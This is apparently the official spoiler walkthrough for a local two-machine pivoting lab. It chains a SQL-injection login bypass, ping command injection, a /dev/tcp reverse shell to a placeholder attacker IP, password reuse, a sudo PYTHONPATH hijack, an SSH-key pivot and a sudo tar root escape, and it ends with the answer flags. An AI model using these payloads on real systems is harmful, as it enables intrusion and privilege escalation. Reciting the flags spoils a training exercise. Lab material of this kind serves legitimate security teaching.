# Observ — Official Walkthrough (SPOILERS)

Full intended solution for the two-machine pivoting lab. Commands assume the
default `docker compose up` setup, with M1 reachable at `127.0.0.1` (web) and
`127.0.0.1:2222` (SSH).

> In a classic lab setup you would attack from a Kali VM on the external
> network. Here the "attacker" is simply your host, and M1's ports are mapped to
> localhost. Everything below works identically.

---

## Machine 1 — `web` (172.20.0.2)

### 1. Enumeration

```bash
nmap -p- -sV 127.0.0.1            # or -p 80,2222
# 22/tcp   OpenSSH
# 80/tcp   Apache + PHP
curl -s http://127.0.0.1/robots.txt
# Disallow: /monitor/
# Disallow: /config.php
```

The web root is the **Observ** monitoring portal with a login form. `robots.txt`
points at `/monitor/`.

### 2. SQL injection — authentication bypass

The login form concatenates input straight into the query. Bypass it with a
classic comment payload (username `admin' -- -`, any password):

```bash
curl -s -c cookies.txt \
  --data-urlencode "username=admin' -- -" \
  --data-urlencode "password=x" \
  http://127.0.0.1/index.php -i | grep Location
# Location: /monitor/dashboard.php
```

You are now authenticated and land on the dashboard, which exposes a **Host
Diagnostics** tool at `/monitor/diag.php`.

### 3. OS command injection — foothold (`www-data`)

The diagnostics tool runs `ping -c 1 <host>` with no sanitization. Inject shell
metacharacters:

```bash
curl -s -b cookies.txt \
  --data-urlencode "host=127.0.0.1; id" \
  http://127.0.0.1/monitor/diag.php
# ... uid=33(www-data) gid=33(www-data) ...
```

Upgrade to an interactive shell with a standard reverse shell payload, e.g.:

```bash
# attacker:  nc -lvnp 9001
# inject:    127.0.0.1; bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/9001 0>&1'
```

### 4. Credential reuse — lateral move to `developer`

Read the app config:

```bash
cat /var/www/html/config.php
# $DB_USER = 'observ_app';
# $DB_PASS = 'Pr0dDbAcc3ss!2023';
```

The database is enumerable and the `notes` table confirms the practice; the DB
password is **reused** for the local `developer` account:

```bash
su developer        # password: Pr0dDbAcc3ss!2023
# (or just: ssh developer@127.0.0.1 -p 2222)
cat ~/local.txt     # OS{w3b_f00th0ld_ch41n3d_t0_r00t_9f2c}
```

### 5. Privilege escalation — PYTHONPATH hijack → root

```bash
sudo -l
# Defaults env_keep += "PYTHONPATH"
# (root) NOPASSWD: /usr/bin/python3 /opt/health/check.py
```

`check.py` is root-owned (not writable) and does `import netcheck`. The real
`netcheck` lives in site-packages, **not** next to the script — and sudo
**preserves `PYTHONPATH`**. So a `netcheck.py` placed on `PYTHONPATH` is imported
and executed as root:

```bash
mkdir -p /tmp/x
cat > /tmp/x/netcheck.py <<'EOF'
import os
os.setuid(0); os.setgid(0)
os.system("/bin/bash")
EOF
sudo PYTHONPATH=/tmp/x /usr/bin/python3 /opt/health/check.py
# id -> uid=0(root)
cat /root/proof.txt   # OS{m1_r00t_pyth0np4th_h1j4ck_a71d}
```

---

## Pivot — from M1 into the internal network

As `developer` (or root) on M1, discover the second interface and the internal
host:

```bash
ip addr                       # eth0 on ext, eth1 on 172.20.0.x
cat ~/.ssh/config             # Host backup-internal -> 172.20.0.3 (svc_backup)
cat ~/notes.txt               # confirms 172.20.0.3 is reachable only from here
ls -la ~/.ssh/                # svc_backup_id_ed25519  (leaked private key)
```

M2 (`172.20.0.3`) is **not** reachable from your attacking host — only from M1.
Any of these pivoting methods works:

**A. SSH ProxyJump (simplest).** Copy the key to your host, then jump through M1:

```bash
# on your host, with the leaked key saved as svc_backup_key (chmod 600)
ssh -J developer@127.0.0.1:2222 \
    -i svc_backup_key svc_backup@172.20.0.3
```

**B. Dynamic port-forward + proxychains:**

```bash
ssh -D 1080 developer@127.0.0.1 -p 2222        # SOCKS proxy through M1
proxychains ssh -i svc_backup_key svc_backup@172.20.0.3
```

**C. From a shell on M1 directly:**

```bash
ssh -i ~/.ssh/svc_backup_id_ed25519 svc_backup@172.20.0.3
```

---

## Machine 2 — `internal` (172.20.0.3)

### 6. Foothold (`svc_backup`)

The leaked key logs you straight in:

```bash
whoami              # svc_backup
cat ~/local.txt     # OS{p1v0t3d_t0_1nt3rn4l_h0st_c3d8}
```

### 7. Privilege escalation — `sudo tar` (GTFOBins) → root

```bash
sudo -l
# (root) NOPASSWD: /usr/bin/tar
```

`tar` allows arbitrary command execution via a checkpoint action
([GTFOBins](https://gtfobins.github.io/gtfobins/tar/)):

```bash
sudo tar -cf /dev/null /dev/null \
     --checkpoint=1 --checkpoint-action=exec=/bin/sh
# id -> uid=0(root)
cat /root/proof.txt   # OS{d0ubl3_pwn_tar_g7f0b1ns_r00t_4e90}
```

**Both machines rooted.** 🏁

---

## Summary of the chain

| # | Host | Technique | Result |
|---|------|-----------|--------|
| 1 | M1 | SQL injection auth bypass | panel access |
| 2 | M1 | OS command injection | `www-data` |
| 3 | M1 | credential reuse (config.php → local user) | `developer` |
| 4 | M1 | `sudo` + `PYTHONPATH` hijack | `root` |
| 5 | — | network pivot via leaked SSH key | reach `172.20.0.3` |
| 6 | M2 | key-based SSH foothold | `svc_backup` |
| 7 | M2 | `sudo tar` GTFOBins | `root` |

## Flags

| Host | User flag | Root flag |
|------|-----------|-----------|
| M1 `web` | `OS{w3b_f00th0ld_ch41n3d_t0_r00t_9f2c}` | `OS{m1_r00t_pyth0np4th_h1j4ck_a71d}` |
| M2 `internal` | `OS{p1v0t3d_t0_1nt3rn4l_h0st_c3d8}` | `OS{d0ubl3_pwn_tar_g7f0b1ns_r00t_4e90}` |
